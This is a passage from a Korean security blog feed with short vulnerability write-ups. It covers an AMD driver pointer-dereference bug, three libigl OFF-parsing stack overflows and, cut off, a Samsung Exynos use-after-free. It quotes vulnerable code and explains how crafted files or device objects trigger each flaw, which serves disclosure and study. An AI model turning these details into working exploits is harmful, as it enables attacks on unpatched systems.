&#xD504;&#xB85C;&#xC138;&#xC11C; &#xAC04; &#xC778;&#xD130;&#xB7FD;&#xD2B8;&#xB97C; &#xC81C;&#xC5B4;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xBA70;, &#xB85C;&#xCEEC; APIC&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xC124;&#xC815;&#xC744; &#xD3EC;&#xD568;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><strong>&#xC704;&#xD5D8;&#xC131;</strong>: &#xACF5;&#xACA9;&#xC790;&#xAC00; APIC&#xB97C; &#xD1B5;&#xD574; CPU &#xAC04; &#xC778;&#xD130;&#xB7FD;&#xD2B8; &#xD1B5;&#xC2E0;&#xC744; &#xC870;&#xC791;&#xD558;&#xAC70;&#xB098; APIC&#xC758; &#xC124;&#xC815;&#xC744; &#xBC14;&#xAFB8;&#xBA74;, &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xC778;&#xD130;&#xB7FD;&#xD2B8; &#xD578;&#xB4E4;&#xB9C1;&#xC744; &#xBC29;&#xD574;&#xD558;&#xC5EC; <strong>&#xC11C;&#xBE44;&#xC2A4; &#xAC70;&#xBD80;(Denial of Service, DoS)</strong> &#xACF5;&#xACA9;&#xC744; &#xC720;&#xBC1C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC798;&#xBABB;&#xB41C; APIC &#xC124;&#xC815;&#xC73C;&#xB85C; &#xC778;&#xD55C; &#xC2DC;&#xC2A4;&#xD15C; &#xBD88;&#xC548;&#xC815;&#xC131;&#xB3C4; &#xD070; &#xC704;&#xD5D8; &#xC694;&#xC18C;&#xC785;&#xB2C8;&#xB2E4;.</li></ul></li><li><strong>IA32_FEATURE_CONTROL MSR</strong><ul><li><strong>MSR &#xC8FC;&#xC18C;</strong>: 0x3A</li><li><strong>&#xC124;&#xBA85;</strong>: VT-x(&#xAC00;&#xC0C1;&#xD654;)&#xC640; &#xAC19;&#xC740; &#xAE30;&#xB2A5;&#xC744; &#xD65C;&#xC131;&#xD654;&#xD558;&#xAC70;&#xB098; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</li><li><strong>&#xC704;&#xD5D8;&#xC131;</strong>: &#xC774; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xD1B5;&#xD574; &#xAC00;&#xC0C1;&#xD654; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC774; &#xAC12;&#xC744; &#xC545;&#xC758;&#xC801;&#xC73C;&#xB85C; &#xC870;&#xC791;&#xD558;&#xBA74; <strong>&#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xAC00;&#xC0C1;&#xD654; &#xAE30;&#xBC18;&#xC758; &#xBCF4;&#xC548; &#xAE30;&#xB2A5;&#xC744; &#xC6B0;&#xD68C;</strong>&#xD558;&#xAC70;&#xB098; &#xBE44;&#xC815;&#xC0C1;&#xC801;&#xC778; &#xAC00;&#xC0C1;&#xD654; &#xD658;&#xACBD;&#xC744; &#xAD6C;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li><strong>Firmware Control MSR (ACPI &#xAD00;&#xB828; MSR)</strong><ul><li><strong>&#xC124;&#xBA85;</strong>: ACPI&#xC640; &#xAC19;&#xC740; &#xD38C;&#xC6E8;&#xC5B4; &#xAD00;&#xB828; &#xC124;&#xC815; &#xC815;&#xBCF4;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><strong>&#xC704;&#xD5D8;&#xC131;</strong>: ACPI&#xB098; &#xC804;&#xC6D0; &#xAD00;&#xB9AC;&#xC640; &#xAD00;&#xB828;&#xB41C; &#xC124;&#xC815;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xBA74; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xC804;&#xC6D0; &#xAD00;&#xB9AC; &#xC815;&#xCC45;&#xC744; &#xC81C;&#xC5B4;&#xD558;&#xC5EC; <strong>&#xACFC;&#xC5F4; &#xBB38;&#xC81C;</strong>&#xB97C; &#xC720;&#xB3C4;&#xD558;&#xAC70;&#xB098; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xB3D9;&#xC791; &#xC0C1;&#xD0DC;&#xB97C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li></ol><h3 id="Second-Vulnerability"><a href="#Second-Vulnerability" class="headerlink" title="Second Vulnerability"></a>Second Vulnerability</h3><p>&#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C;&#xB294; InnerIrpIoCtlHandler() &#xBC0F; InnerIrpIoCtlHandler()&#xB97C; &#xAC70;&#xC838; callDriver()&#xB77C;&#xB294; &#xD568;&#xC218;&#xAE4C;&#xC9C0; &#xC720;&#xC800; &#xBC84;&#xD37C;&#xB97C; &#xADF8;&#xB300;&#xB85C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;. callDriver()&#xC5D0;&#xC11C;&#xB294; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xB41C; &#xC720;&#xC800; &#xBC84;&#xD37C;&#xB97C; IoGetAttachedDeviceReference()&#xC5D0; &#xC804;&#xB2EC;&#xD558;&#xACE0; &#xBC18;&#xD658;&#xB41C; &#xAC12;&#xC744; IofCallDriver()&#xC5D0; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function">int64 __fastcall <span class="hljs-title">callDriver</span><span class="hljs-params">(PDEVICE_OBJECT DeviceObject, int64 a2, <span class="hljs-keyword">int</span> a3, UNICODE_STRING *a4, <span class="hljs-keyword">int</span> a5, <span class="hljs-keyword">int</span> a6)</span></span><span class="hljs-function"></span>{    _DEVICE_OBJECT *AttachedDeviceReference; <span class="hljs-comment">// rdi</span>    PIRP Irp; <span class="hljs-comment">// rax</span>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> Status; <span class="hljs-comment">// ebx</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_STACK_LOCATION</span> *<span class="hljs-title">CurrentStackLocation</span>;</span> <span class="hljs-comment">// rcx</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_STATUS_BLOCK</span> <span class="hljs-title">IoStatusBlock</span>;</span> <span class="hljs-comment">// [rsp+40h] [rbp-38h] BYREF</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">KEVENT</span> <span class="hljs-title">event</span>;</span> <span class="hljs-comment">// [rsp+50h] [rbp-28h] BYREF</span>    KeInitializeEvent(&amp;event, NotificationEvent, <span class="hljs-number">0</span>);    AttachedDeviceReference = IoGetAttachedDeviceReference(DeviceObject); [<span class="hljs-number">1</span>]    Irp = IoBuildSynchronousFsdRequest(IRP_MJ_PNP, AttachedDeviceReference, <span class="hljs-number">0L</span>L, <span class="hljs-number">0</span>, <span class="hljs-number">0L</span>L, &amp;event, &amp;IoStatusBlock);        <span class="hljs-keyword">if</span> (Irp) {        CurrentStackLocation = Irp-&gt;Tail.Overlay.CurrentStackLocation;        CurrentStackLocation[<span class="hljs-number">-1</span>].Parameters.FileSystemControl.OutputBufferLength = <span class="hljs-number">0</span>;        CurrentStackLocation[<span class="hljs-number">-1</span>].Parameters.FileSystemControl.InputBufferLength = a4;        *(_QWORD *)&amp;CurrentStackLocation[<span class="hljs-number">-1</span>].MinorFunction = (a3 != <span class="hljs-number">0</span>) + <span class="hljs-number">15</span>;        CurrentStackLocation[<span class="hljs-number">-1</span>].Parameters.FileSystemControl.FsControlCode = a5;        CurrentStackLocation[<span class="hljs-number">-1</span>].Parameters.FileSystemControl.Type3InputBuffer = a6;                Irp-&gt;IoStatus.Status = STATUS_NOT_SUPPORTED;        Status = IofCallDriver(AttachedDeviceReference, Irp); [<span class="hljs-number">2</span>]                <span class="hljs-keyword">if</span> (Status == STATUS_PENDING) {            KeWaitForSingleObject(&amp;event, Executive, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0L</span>L);            Status = IoStatusBlock.Status;        }    }    <span class="hljs-keyword">else</span> {        Status = STATUS_INSUFFICIENT_RESOURCES;    }        ObDereferenceObject(AttachedDeviceReference);    <span class="hljs-keyword">return</span> Status;}</code></pre><p> DeviceObject&#xC758; DriverObject &#xBD80;&#xBD84;&#xC758; MajorFunction &#xBC30;&#xC5F4; &#xB0B4;&#xBD80;&#xC5D0; &#xC788;&#xB294; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. DeviceObject&#xB97C; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; MajorFunction &#xBC30;&#xC5F4; &#xB0B4;&#xBD80;&#xC758; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">{  _IO_STACK_LOCATION *v2; <span class="hljs-comment">// rax</span>  __int64 MajorFunction; <span class="hljs-comment">// r8</span>  <span class="hljs-keyword">if</span> ( IopDispatchCallDriver )  {    <span class="hljs-keyword">if</span> ( IopDispatchCallDriver == <span class="hljs-number">3</span> )      <span class="hljs-keyword">return</span> IopPerfCallDriver((PADAPTER_OBJECT)DeviceObject);    <span class="hljs-keyword">else</span>      <span class="hljs-keyword">return</span> IovCallDriver(DeviceObject);  }  <span class="hljs-keyword">else</span>  {    <span class="hljs-keyword">if</span> ( --Irp-&gt;CurrentLocation &lt;= <span class="hljs-number">0</span> )      KeBugCheckEx(<span class="hljs-number">0x35</span>u, (ULONG_PTR)Irp, <span class="hljs-number">0L</span>L, <span class="hljs-number">0L</span>L, <span class="hljs-number">0L</span>L);    v2 = Irp-&gt;Tail.Overlay.CurrentStackLocation - <span class="hljs-number">1</span>;    Irp-&gt;Tail.Overlay.CurrentStackLocation = v2;    MajorFunction = v2-&gt;MajorFunction;    v2-&gt;DeviceObject = DeviceObject;    <span class="hljs-keyword">if</span> ( (_BYTE)MajorFunction == <span class="hljs-number">22</span> &amp;&amp; (<span class="hljs-keyword">unsigned</span> __int8)(v2-&gt;MinorFunction - <span class="hljs-number">2</span>) &lt;= <span class="hljs-number">1u</span> )      <span class="hljs-keyword">return</span> IopPoHandleIrp(Irp);    <span class="hljs-keyword">else</span>      <span class="hljs-keyword">return</span> ((__int64 (__fastcall *)(PDEVICE_OBJECT))DeviceObject-&gt;DriverObject-&gt;MajorFunction[MajorFunction])(DeviceObject); [<span class="hljs-number">3</span>]  }}</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/AMD/">AMD</category>
      
      <category domain="https://hackyboiz.github.io/tags/Adrenalin/">Adrenalin</category>
      
      <category domain="https://hackyboiz.github.io/tags/atdcm64a-sys/">atdcm64a.sys</category>
      
      <category domain="https://hackyboiz.github.io/tags/MSR-Read/">MSR Read</category>
      
      <category domain="https://hackyboiz.github.io/tags/Arbitrary-Pointer-Dereference/">Arbitrary Pointer Dereference</category>
      
      
      <comments>https://hackyboiz.github.io/2024/11/03/j0ker/2024-11-03/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-24684/CVE-2024-24685/CVE-2024-24686: libigl의 off 파일 파싱 중 발생한 세 가지 Stack Overflow 취약점</title>
      <link>https://hackyboiz.github.io/2024/10/30/ogu123/cve-2024-24684/</link>
      <guid>https://hackyboiz.github.io/2024/10/30/ogu123/cve-2024-24684/</guid>
      <pubDate>Wed, 30 Oct 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.talosintelligence.com/vulnerability_rep</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://www.talosintelligence.com/vulnerability_reports/TALOS-2024-1929">https://www.talosintelligence.com/vulnerability_reports/TALOS-2024-1929</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>libigl 2.5.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>libigl&#xC740; 3D &#xC9C0;&#xC624;&#xBA54;&#xD2B8;&#xB9AC; &#xCC98;&#xB9AC;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; C++ &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB85C; &#xAC8C;&#xC784; &#xAC1C;&#xBC1C;&#xC774;&#xB098; 3D &#xD504;&#xB9B0;&#xD305;, &#xB2E4;&#xC591;&#xD55C; &#xD30C;&#xC77C; &#xD3EC;&#xB9F7;&#xC758; &#xC9C0;&#xC624;&#xBA54;&#xD2B8;&#xB9AC; &#xCC98;&#xB9AC;&#xAC00; &#xD544;&#xC694;&#xD55C; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; off(object file format) &#xD30C;&#xC77C;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294;<code>readOFF</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC138; &#xAC00;&#xC9C0; Stack Overflow &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs maxima">    IGL_INLINE bool igl::readOFF(      FILE * off_file,      <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;Scalar &gt; &gt; &amp; V,      <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;Index &gt; &gt; &amp; F,      <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;Scalar &gt; &gt; &amp; N,      <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;Scalar &gt; &gt; &amp; C)            ...      // First line <span class="hljs-built_in">is</span> always OFF[<span class="hljs-number">0</span>]   char header[<span class="hljs-number">1000</span>];        ...[<span class="hljs-number">1</span>]   <span class="hljs-keyword">if</span>(fscanf(off_file,<span class="hljs-string">&quot;%s\n&quot;</span>,header)!=<span class="hljs-number">1</span>         || !(           <span class="hljs-built_in">string</span>(header).<span class="hljs-built_in">compare</span>(<span class="hljs-number">0</span>, OFF.<span class="hljs-built_in">length</span>(), OFF)==<span class="hljs-number">0</span> ||           <span class="hljs-built_in">string</span>(header).<span class="hljs-built_in">compare</span>(<span class="hljs-number">0</span>, COFF.<span class="hljs-built_in">length</span>(), COFF)==<span class="hljs-number">0</span> ||           <span class="hljs-built_in">string</span>(header).<span class="hljs-built_in">compare</span>(<span class="hljs-number">0</span>,NOFF.<span class="hljs-built_in">length</span>(),NOFF)==<span class="hljs-number">0</span>))      {           ...      }      ...      <span class="hljs-built_in">return</span> <span class="hljs-literal">true</span>;</code></pre><p>CVE-2024-24684&#xB294; &#xD5E4;&#xB354; &#xD30C;&#xC2F1; &#xC911; &#xBC1C;&#xC0DD;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; <code>header</code> &#xD06C;&#xAE30;&#xAC00; 1000 byte&#xB85C; &#xACE0;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC9C0;&#xB9CC; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xD30C;&#xC77C; &#xD5E4;&#xB354; &#xCCAB; &#xC904;&#xC5D0; 1000 byte&#xBCF4;&#xB2E4; &#xD070; off &#xD30C;&#xC77C;&#xC744; &#xBCF4;&#xB0BC; &#xACBD;&#xC6B0; Stack Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs arduino"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> Scalar, <span class="hljs-keyword">typename</span> Index&gt;<span class="hljs-function">IGL_INLINE <span class="hljs-keyword">bool</span> <span class="hljs-title">igl::readOFF</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  FILE * off_file,</span></span><span class="hljs-function"><span class="hljs-params">  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;Scalar &gt; &gt; &amp; V,</span></span><span class="hljs-function"><span class="hljs-params">  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;Index &gt; &gt; &amp; F,</span></span><span class="hljs-function"><span class="hljs-params">  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;Scalar &gt; &gt; &amp; N,</span></span><span class="hljs-function"><span class="hljs-params">  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;Scalar &gt; &gt; &amp; C)</span></span><span class="hljs-function"></span>{    ...  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i&lt;number_of_vertices;)  {[<span class="hljs-number">0</span>] fgets(<span class="hljs-built_in">line</span>, <span class="hljs-number">1000</span>, off_file);    <span class="hljs-keyword">double</span> x,y,z,nx,ny,nz;[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span>(<span class="hljs-built_in">sscanf</span>(<span class="hljs-built_in">line</span>, <span class="hljs-string">&quot;%lg %lg %lg %lg %lg %lg&quot;</span>,&amp;x,&amp;y,&amp;z,&amp;nx,&amp;ny,&amp;nz)&gt;= <span class="hljs-number">3</span>)    {      ...    }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>([<span class="hljs-number">2</span>]     <span class="hljs-built_in">fscanf</span>(off_file,<span class="hljs-string">&quot;%[#]&quot;</span>,&amp;tic_tac_toe)==<span class="hljs-number">1</span>)    {[<span class="hljs-number">3</span>]   <span class="hljs-keyword">char</span> comment[<span class="hljs-number">1000</span>];[<span class="hljs-number">4</span>]   <span class="hljs-built_in">fscanf</span>(off_file,<span class="hljs-string">&quot;%[^\n]&quot;</span>,comment);    }<span class="hljs-keyword">else</span>    {        ...    }  }  ...  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;}</code></pre><p>CVE-2024-24685&#xB294; off &#xD30C;&#xC77C;&#xC758; vertex &#xD30C;&#xC2F1; &#xC911; &#xBC1C;&#xC0DD;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; [0]&#xBC88;&#xC5D0;&#xC11C; off &#xD30C;&#xC77C; &#xD55C; &#xC904;&#xC744; &#xC77D;&#xACE0; vertex &#xC88C;&#xD45C; &#xD615;&#xC2DD;&#xC77C; &#xACBD;&#xC6B0; [1]&#xBC88;&#xC5D0;&#xC11C; &#xC88C;&#xD45C; &#xB370;&#xC774;&#xD130;&#xB85C; &#xD30C;&#xC2F1; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB9CC;&#xC57D;, &#xC88C;&#xD45C; &#xD615;&#xC2DD;&#xC774; &#xC544;&#xB2C8;&#xB77C;&#xBA74; [2]&#xBC88;&#xC5D0;&#xC11C; &#xC8FC;&#xC11D;(<code>#</code>) &#xC5EC;&#xBD80;&#xB97C; &#xD655;&#xC778;&#xD558;&#xACE0; &#xC8FC;&#xC11D;&#xC77C; &#xACBD;&#xC6B0; [3][4]&#xBC88;&#xC744; &#xD1B5;&#xD574; comment &#xBC30;&#xC5F4;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C;, &#xACF5;&#xACA9;&#xC790;&#xB294; &#xD30C;&#xC77C; &#xD5E4;&#xB354; &#xC774;&#xD6C4; &#xC8FC;&#xC11D;&#xC758; &#xAE38;&#xC774;&#xAC00; 1000 byte&#xBCF4;&#xB2E4; &#xD070; off &#xD30C;&#xC77C;&#xC744; &#xBCF4;&#xB0B4; Stack Overflow &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs maxima">template &lt;typename Scalar, typename Index&gt;IGL_INLINE bool igl::readOFF(  FILE * off_file,  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;Scalar &gt; &gt; &amp; V,  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;Index &gt; &gt; &amp; F,  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;Scalar &gt; &gt; &amp; N,  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;Scalar &gt; &gt; &amp; C)    ...  // Read faces  <span class="hljs-keyword">for</span>(int i = <span class="hljs-number">0</span>;i&lt;number_of_faces;)  {    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;Index &gt; face;    int valence;[<span class="hljs-number">0</span>] <span class="hljs-keyword">if</span>(fscanf(off_file,<span class="hljs-string">&quot;%d&quot;</span>,&amp;valence)==<span class="hljs-number">1</span>)    {        ...    }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>([<span class="hljs-number">1</span>]          fscanf(off_file,<span class="hljs-string">&quot;%[#]&quot;</span>,&amp;tic_tac_toe)==<span class="hljs-number">1</span>)    {[<span class="hljs-number">2</span>]   char comment[<span class="hljs-number">1000</span>];[<span class="hljs-number">3</span>]   fscanf(off_file,<span class="hljs-string">&quot;%[^\n]&quot;</span>,comment);    }<span class="hljs-keyword">else</span>    {        ...  }  fclose(off_file);  <span class="hljs-built_in">return</span> <span class="hljs-literal">true</span>;}</code></pre><p>CVE-2024-24686&#xC740; off &#xD30C;&#xC77C;&#xC758; face &#xD30C;&#xC2F1; &#xACFC;&#xC815; &#xC911; &#xBC1C;&#xC0DD;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; [0]&#xBC88;&#xC5D0;&#xC11C; &#xAC01; face&#xB97C; &#xC774;&#xB8E8;&#xB294; vertex &#xAC1C;&#xC218;&#xB97C; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xB9CC;&#xC57D;, &#xC2E4;&#xD328;&#xD560; &#xACBD;&#xC6B0; [1]&#xBC88;&#xC5D0;&#xC11C; &#xC8FC;&#xC11D;(<code>#</code>) &#xC5EC;&#xBD80;&#xB97C; &#xD655;&#xC778;&#xD558;&#xACE0; &#xC8FC;&#xC11D;&#xC77C; &#xACBD;&#xC6B0; [2][3]&#xBC88;&#xC744; &#xD1B5;&#xD574; comment &#xBC30;&#xC5F4;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C;, &#xACF5;&#xACA9;&#xC790;&#xB294; vertex &#xD30C;&#xC2F1; &#xC774;&#xD6C4; &#xC8FC;&#xC11D;&#xC758; &#xAE38;&#xC774;&#xAC00; 1000 byte&#xBCF4;&#xB2E4; &#xD070; off &#xD30C;&#xC77C;&#xC744; &#xBCF4;&#xB0B4; Stack Overflow &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://segeval.cs.princeton.edu/public/off_format.html">https://segeval.cs.princeton.edu/public/off_format.html</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/libigl/">libigl</category>
      
      <category domain="https://hackyboiz.github.io/tags/Stack-Overflow/">Stack Overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/off-file/">off file</category>
      
      
      <comments>https://hackyboiz.github.io/2024/10/30/ogu123/cve-2024-24684/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-44068: Samsung Exynos UAF 취약점</title>
      <link>https://hackyboiz.github.io/2024/10/27/l0ch/2024-10-27/</link>
      <guid>https://hackyboiz.github.io/2024/10/27/l0ch/2024-10-27/</guid>
      <pubDate>Sun, 27 Oct 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://googleprojectzero.github.io/0days-in-the-wild//0d</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2024/CVE-2024-44068.html">https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2024/CVE-2024-44068.html</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Samsung Exynos (9820, 9825, 980, 990, 850, W920) &lt; SMR-Oct-2024</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC0BC;&#xC131;&#xC758; &#xBAA8;&#xBC14;&#xC77C; &#xBC0F; &#xC6E8;&#xC5B4;&#xB7EC;&#xBE14; &#xD504;&#xB85C;&#xC138;&#xC11C;&#xC778; Exynos&#xC5D0;&#xC11C; UAF &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; Google Project Zero&#xC758; &#xC138;&#xBD80; &#xBD84;&#xC11D; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xBBF8;&#xB514;&#xC5B4;&#xC758; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xAC00;&#xC18D;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xB294; m2m &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC758; <code>M2M1SHOT_IOC_PROCESS</code> IOCTL &#xB8E8;&#xD2F4;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xB8E8;&#xD2F4;&#xC740; &#xC720;&#xC800;&#xB79C;&#xB4DC; &#xD398;&#xC774;&#xC9C0;&#xB97C; I/O &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xB9E4;&#xD551; &#xBC0F; &#xB9E4;&#xD551; &#xD574;&#xC81C;&#xD558;&#xACE0;, &#xD38C;&#xC6E8;&#xC5B4; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p> I/O &#xBA54;&#xBAA8;&#xB9AC; &#xB9E4;&#xD551; &#xC2DC; <a href="https://github.com/CruelKernel/samsung-exynos9820/blob/41aba77656e3377e8c55691b8b807d915e545343/drivers/media/m2m1shot-helper.c#L60">m2m1shot_dma_addr_map</a> &#x2192; <a href="https://github.com/CruelKernel/samsung-exynos9820/blob/41aba77656e3377e8c55691b8b807d915e545343/drivers/iommu/exynos-iovmm.c#L510">exynos_iovmm_map_userptr</a> &#x2192; <a href="https://github.com/CruelKernel/samsung-exynos9820/blob/41aba77656e3377e8c55691b8b807d915e545343/drivers/iommu/exynos-iommu.c#L1713">exynos_iommu_map_userptr</a> &#x2192; <a href="https://github.com/CruelKernel/samsung-exynos9820/blob/41aba77656e3377e8c55691b8b807d915e545343/drivers/iommu/exynos-iommu.c#L1661">sysmmu_map_pud</a> &#xD638;&#xCD9C; &#xCCB4;&#xC778;&#xC744; &#xD1B5;&#xD574; <a 